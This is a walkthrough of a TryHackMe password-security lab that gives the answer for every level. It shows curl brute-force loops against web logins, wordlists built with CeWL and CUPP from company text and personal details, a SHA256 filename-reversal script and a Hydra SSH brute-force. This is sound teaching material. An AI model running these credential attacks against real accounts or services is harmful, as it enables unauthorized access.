# TryHackMe: Operation Checkmate — Walkthrough

**Room type:** CTF / Guided  
**Category:** Password Security / OSINT / Custom Wordlists  
**Tools:** curl, CeWL, CUPP, hashcat, Hydra  

---

## Overview

Operation Checkmate is a five-level password security assessment targeting Marco Bianchi, a systems administrator who reused weak, predictable, and pattern-based passwords across multiple internal services. Each level targets a different service and requires a different technique — from default credentials to personal info harvesting to SHA256 hash reversal to SSH brute-forcing.

Before starting, add all the hostnames to `/etc/hosts`:

```bash
echo '10.146.141.211 firewall.thm jobs.thm social.thm' | sudo tee -a /etc/hosts
```

---

## A Note on the Rate Limiter and curl Behaviour

Two things caused friction throughout this room that are worth understanding before you start.

**The cooldown.** The main application at port 5000 warns against blind brute-forcing, and the rate limiter apparently applies globally across all services. Any burst of automated requests — even with a 1-second delay — can trigger a temporary cooldown that blocks further login attempts for a few minutes. The practical lesson: when using loops to test passwords, always add a `sleep` between requests, and keep the wordlist as targeted as possible before running it. A 100-entry targeted list with a 1-second delay is far less likely to trigger a cooldown than a 10,000-entry list hammered at full speed, even with a short sleep.

**curl stalling.** On some lab instances, `curl` to certain ports (particularly 5003) would stall and never return. This is a networking quirk between WSL2 and the THM VPN — the connection establishes but the response never arrives. In these cases, browsing to the URL directly in the host browser works fine because it uses the Windows network stack rather than WSL2's. The browser's developer tools (Inspector → Network tab) then become the alternative to `curl` for pulling URLs, filenames, and page source. When `curl` stalls, don't waste time debugging it — switch to the browser.

---

## Level 1 — FirewallOS Default Credentials

**Target:** `firewall.thm:5001`  
**Hint:** Marco deployed a firewall but kept default credentials.

Navigate to `http://10.146.141.211:5001`. A FirewallOS Management Console login page appears with the username field pre-filled as `admin`. The task is to find the default password.

Default credential lists for firewall consoles typically start with `admin/admin`, `admin/password`, and `admin/1234`. Rather than guessing manually, test them programmatically:

```bash
for pass in admin password 1234 12345 admin123 firewall root default; do
  result=$(curl -s -X POST http://10.146.141.211:5001/login \
    -d "username=admin&password=$pass" -L)
  if echo "$result" | grep -qi "invalid\|error"; then
    echo "FAIL: $pass"
  else
    echo "SUCCESS: $pass"
    break
  fi
done
```

**Answer: `12345`**

The takeaway: default credentials are still one of the most common real-world vulnerabilities. Many vendors ship appliances with well-known defaults, and administrators who don't change them leave doors open. A quick search for "FirewallOS default credentials" or a standard default-creds list would have found this in seconds.

---

## Level 2 — Employee Portal with Company Keywords

**Target:** `jobs.thm:5002`  
**Hint:** Marco used common company keywords as passwords.

Navigate to `http://10.146.141.211:5002`. An Engineering Careers page appears. The login is at `/login` with username `marco` pre-filled in the placeholder.

The page itself is the wordlist. Company keyword badges are displayed prominently in the hero section:

```
innovation  excellence  security  digital  cloud  future  talent
```

Rather than manually guessing, use CeWL to spider the careers site and extract all unique words:

```bash
cewl -d 2 -m 3 --lowercase http://10.146.141.211:5002 -w level2_words.txt
```

Then test each word as Marco's password with a delay to avoid the rate limiter:

```bash
while IFS= read -r pass; do
  result=$(curl -s -X POST http://10.146.141.211:5002/login \
    -d "username=marco&password=$pass" -L)
  if echo "$result" | grep -qi "invalid\|error"; then
    echo "FAIL: $pass"
  else
    echo "SUCCESS: $pass"
    break
  fi
  sleep 1
done < level2_words.txt
```

**Answer: `excellence`**

The lesson: when an attacker knows your company, they know your likely password vocabulary. Developers named their product "excellence," so their sysadmin used "excellence" as a password. CeWL automates exactly this attack — any word visible on your website is a candidate password.

---

## Level 3 — Social Platform with Personal Info

**Target:** `social.thm:5003`  
**Hint:** Derive Marco's password from personal info.

The social platform login page includes a subtle hint: "Use the details from jobs.thm to generate Marco's password." Navigate to the employee profile at `http://10.146.141.211:5002/profile` after logging in with `marco/excellence`. Marco's profile reveals:

- **First name:** Marco
- **Surname:** Bianchi
- **Nickname:** marky
- **Birthdate:** 14021995 (14 February 1995)

This is exactly the kind of information CUPP (Common User Passwords Profiler) is designed for. CUPP takes personal details and generates a targeted wordlist of likely passwords based on common patterns (name + birthdate, nickname + year, surname + numbers, etc.):

```bash
cupp -i
```

Enter Marco's details when prompted. CUPP generates `marco.txt` with thousands of combinations. The password field on social.thm appeared to be around 11 characters, so filter to that length:

```bash
grep -E '^.{10,12}$' marco.txt > marco_filtered.txt
```

Then spray against social.thm with a 1-second delay:

```bash
while IFS= read -r pass; do
  result=$(curl -s -X POST http://10.146.141.211:5003/login \
    -d "username=marco&password=$pass" -L)
  if echo "$result" | grep -qi "invalid\|error"; then
    echo "FAIL: $pass"
  else
    echo "SUCCESS: $pass"
    break
  fi
  sleep 1
done < marco_filtered.txt
```

**Answer: `Bianchi2495`**

Note on the asterisk count: the login form's password field showed what appeared to be 10 asterisks, but this was an estimate from a screenshot — not a reliable count. The actual password `Bianchi2495` is 11 characters. Don't over-filter based on visual asterisk counts.

The lesson: people build passwords from things they know and care about. Personal information available through OSINT — names, nicknames, birthdays — directly feeds into targeted wordlist generation. CUPP automates this exact threat model.

---

## Level 4 — SHA256 Filename Reversal

**Target:** `social.thm:5003`  
**Task:** The platform renames uploaded profile pictures to the SHA256 hash of the original filename. Find the original filename.

After logging into social.thm, use the browser's developer tools (Inspector → Network tab) to find Marco's profile picture URL:

```
http://10.146.141.211:5003/uploads/d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b.png
```

The filename is the SHA256 hash of Marco's original upload. SHA256 is a one-way function — you cannot reverse it mathematically. But you can brute-force it by hashing candidate filenames and comparing the result.

The naive approach is to try common image names (`profile.png`, `avatar.png`, etc.), but the smarter approach is to use a real wordlist. rockyou.txt contains millions of common words, and filenames are often just plain words:

```bash
python3 -c "
import hashlib
target = 'd34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b'
with open('/usr/share/wordlists/rockyou.txt', 'rb') as f:
    for line in f:
        word = line.strip().decode('utf-8', errors='ignore')
        for ext in ['.png', '.jpg', '.jpeg', '']:
            filename = word + ext
            h = hashlib.sha256(filename.encode()).hexdigest()
            if h == target:
                print(f'MATCH: {filename}')
                exit()
"
```

**Answer: `family`**

The original filename was simply `family` — no extension. The platform stored it as its SHA256 hash for "privacy and storage consistency," but this provides no real security: anyone who can observe the URL and has a wordlist can reverse common filenames in seconds.

The lesson: SHA256 hashing filenames is not the same as encrypting them. If the input space is small and predictable (common words, names, dates), a dictionary attack trivially reverses it. This is the same reason MD5 and SHA256 are inadequate for password storage without proper salting and key-stretching.

---

## Level 5 — SSH Brute-Force with Pattern-Based Password

**Target:** SSH on port 22, username `marco`  
**Hint:** Marco posted his password pattern on social.thm.

After logging into social.thm, Marco's feed contains a post:

> "My tip for strong password: I take a **company keyword**, **capitalize** it..."

The pattern: take a keyword from the company vocabulary, capitalize the first letter, then append something predictable (a year, a number, a symbol). We already know the company keywords from Level 2: `innovation`, `excellence`, `security`, `digital`, `cloud`, `future`, `talent`.

Generate a targeted wordlist by combining capitalized keywords with common suffixes:

```bash
python3 -c "
keywords = ['innovation','excellence','security','digital','cloud','future','talent','engineering','careers']
suffixes = ['1','12','123','1234','12345','!','1!','123!','2024','2025','2024!','2025!','@1','@123']
for word in keywords:
    cap = word.capitalize()
    print(cap)
    for s in suffixes:
        print(cap + s)
" > ssh_wordlist.txt
```

This produces 135 targeted candidates. Run Hydra against SSH:

```bash
hydra -l marco -P ssh_wordlist.txt ssh://10.146.141.211 -t 4 -V
```

**Answer: `Security2024!`**

The lesson: knowing someone's password pattern is almost as good as knowing their password. "Capitalize a company keyword and add a year and exclamation mark" describes millions of real passwords. Once a pattern is identified — from a social media post, a policy document, or a previous credential dump — the search space collapses from billions to dozens.

---

## Summary

| Level | Service | Technique | Answer |
|-------|---------|-----------|--------|
| 1 | FirewallOS :5001 | Default credentials | `12345` |
| 2 | Employee Portal :5002 | CeWL website wordlist | `excellence` |
| 3 | Social Platform :5003 | CUPP personal info wordlist | `Bianchi2495` |
| 4 | Social Platform :5003 | SHA256 reversal via rockyou | `family` |
| 5 | SSH :22 | Pattern-based wordlist + Hydra | `Security2024!` |

---

## Key Takeaways

**Default credentials are never acceptable.** Level 1 fell to `12345` — a password that appears in every default credentials list ever compiled. Any internet-facing service with default credentials is compromised the moment it goes online.

**Your website is your attacker's wordlist.** CeWL exists because people use company vocabulary in their passwords. Every word on your marketing page, every product name, every slogan is a candidate. Marco used `excellence` — a word displayed on the company careers page in a prominent badge.

**OSINT feeds targeted attacks.** The personal details on Marco's employee profile (surname, birthdate, nickname) directly generated the Level 3 password through CUPP. Information that seems innocuous in isolation — a birthday, a nickname — becomes a password cracking primitive when combined.

**Hashing is not obfuscation.** SHA256 of a predictable input is reversible in seconds with a wordlist. The Level 4 "privacy" feature provided no real protection. Proper obfuscation requires either encryption (reversible with a key) or hashing with a large, unpredictable salt (not a predictable filename).

**Password patterns collapse the search space.** Security2024! follows a pattern that Marco himself described publicly. Once the pattern is known, a 135-entry targeted wordlist outperforms a million-entry generic one. Password policies that prescribe predictable patterns (capital letter, number, symbol) may actually make passwords easier to crack, not harder.
